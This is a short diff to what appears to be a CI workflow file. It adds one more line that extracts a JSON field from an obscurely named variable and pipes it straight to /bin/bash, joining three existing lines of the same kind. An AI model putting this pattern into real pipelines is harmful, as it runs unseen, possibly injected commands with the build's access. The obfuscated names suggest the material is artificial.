@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$rav00" | jq -r .dvgh5 | /bin/bash
           printf '%s' "$ukt6910" | jq -r .vem9 | /bin/bash
           echo $xil1079 | jq -r .spdkj9681 | /bin/bash
+          printf '%s' "$akfx16" | jq -r .o729 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
